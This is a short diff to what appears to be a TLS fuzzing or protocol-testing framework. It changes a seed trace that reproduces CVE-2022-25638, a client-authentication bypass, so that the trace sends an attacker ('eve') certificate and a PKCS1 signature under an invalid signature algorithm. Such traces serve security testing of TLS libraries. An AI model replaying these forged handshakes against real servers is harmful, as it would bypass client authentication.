@@ -866,24 +866,24 @@ pub fn seed_cve_2022_25638(server: AgentName, server_put: PutDescriptor) -> Trac
     let certificate_rsa = term! {
         fn_certificate13(
             (fn_get_context((@certificate_request_message))),
-            fn_empty_certificate_chain
+            //fn_empty_certificate_chain
             // Or append eve cert
-            /*(fn_append_certificate_entry(
+            (fn_append_certificate_entry(
                 (fn_certificate_entry(
                     fn_eve_cert
                 )),
               fn_empty_certificate_chain
-            ))*/
+            ))
         )
     };
 
     let certificate_verify_rsa = term! {
         fn_certificate_verify(
             (fn_invalid_signature_algorithm),
-            // Option 1 (something random, only possible because of fn_empty_certificate_chain):
-            fn_eve_cert // or fn_new_pubkey12, fn_empty_bytes_vec
+            // Option 1 (something random, only possible because of fn_empty_certificate_chain, if FAIL_IF_NO_PEER_CERT is unset):
+            //fn_eve_cert // or fn_new_pubkey12, fn_empty_bytes_vec
             // Option 2 (impersonating eve, you have to send eve cert):
-            // fn_eve_pkcs1_signature
+            fn_eve_pkcs1_signature
             // Option 3 (for testing):
             /* (fn_rsa_sign_client(
                 (fn_certificate_transcript(((server, 0)))),
